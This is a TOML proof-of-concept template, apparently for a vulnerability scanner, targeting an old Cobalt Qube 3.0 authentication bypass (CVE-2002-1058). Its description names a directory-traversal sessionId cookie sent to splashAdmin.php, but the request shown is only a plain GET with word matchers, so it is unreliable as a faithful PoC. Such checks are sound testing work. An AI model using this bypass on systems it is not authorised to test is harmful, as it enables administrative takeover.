[info]
author = "ave"
description = "通过向 splashAdmin.php 发送包含目录遍历序列的 sessionId Cookie，绕过身份认证获取 Qube 管理员权限"
id = "POC-AVE-2002-0525"
name = "CVE-2002-1058 Cobalt Qube 3.0 Authentication Bypass PoC"
severity = "critical"
tags = ["ave-2002-0525"]
vuln_id = [
    "CVE-2002-1058",
    "AVE-2002-0525",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/splashAdmin.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Qube Admin",
    "Administration",
]
